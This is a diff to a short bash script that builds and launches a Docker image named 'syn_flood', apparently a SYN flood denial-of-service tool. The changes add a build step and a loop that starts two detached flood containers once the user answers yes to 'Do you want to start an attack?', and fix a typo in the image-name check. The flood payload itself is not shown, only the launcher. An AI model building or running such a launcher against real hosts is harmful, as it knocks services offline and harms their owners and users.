@@ -1,11 +1,19 @@
 #!/usr/bin/env bash
 img_str=$(docker image ls)
 
-echo "Developed by GIWYD2 - use with caution"
+echo "Developed by GIWYD2 (MIT license)"
 
 attack-option () {
     start-attack (){
       echo "Embrace for impact"
+      {
+        for i in {1..2}
+        do
+           echo "Container $i"
+           docker run syn_flood &
+        done
+      }
+      #docker stats
     }
 
     echo "Do you want to start an attack?"
@@ -19,10 +27,11 @@ attack-option () {
 
 build_image () {
    echo 'BUILDING...'
+   docker build  -t syn_flood  .
    attack-option
 }
 
-if [[ $img_str == *"sxn_flood"* ]];
+if [[ $img_str == *"syn_flood"* ]];
   then
     echo "SYN Flood image found"
     attack-option
